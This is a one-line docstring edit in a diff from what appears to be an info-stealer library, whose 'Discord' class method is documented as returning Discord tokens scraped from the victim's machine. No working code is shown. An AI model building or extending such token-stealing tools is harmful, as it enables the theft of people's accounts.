@@ -91,7 +91,7 @@ class Discord:
 
         Parameters:
             self (object): The object passed to the method
-            conv (bool): Boolean whether to append the data as a converted value or a StealerLib object
+            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object
 
         Returns:
             list: A list of scraped Discord tokens from the machine as plaintext or a StealerLib object
